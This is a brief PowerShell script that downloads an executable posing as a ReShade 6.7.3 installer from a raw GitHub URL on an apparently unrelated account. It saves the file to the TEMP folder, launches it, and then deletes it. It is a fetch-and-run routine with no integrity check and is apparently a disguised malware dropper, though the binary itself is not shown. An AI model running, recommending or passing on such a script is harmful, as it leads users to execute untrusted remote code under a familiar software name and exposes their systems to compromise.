$url = "https://raw.githubusercontent.com/phukancontract-dev/ppv4/main/ReShade_Setup_6.7.3.exe"

$tempPath = Join-Path $env:TEMP "ReShade_Setup_6.7.3.exe"

Write-Host "Downloading..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $url -OutFile $tempPath -UseBasicParsing -ErrorAction Stop

    if (!(Test-Path $tempPath)) {
        throw "Download failed: file not found"
    }

    if ((Get-Item $tempPath).Length -lt 1MB) {
        throw "Downloaded file is too small (likely corrupted)"
    }

    Write-Host "Download completed." -ForegroundColor Green
    Write-Host "Launching installer..." -ForegroundColor Green

    Start-Process -FilePath $tempPath -Wait

    Write-Host "Installer finished." -ForegroundColor Magenta
    Write-Host "Cleaning temporary file..." -ForegroundColor Yellow

    Remove-Item -Path $tempPath -Force -ErrorAction SilentlyContinue

    Write-Host "Done." -ForegroundColor Green
}
catch {
    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
}
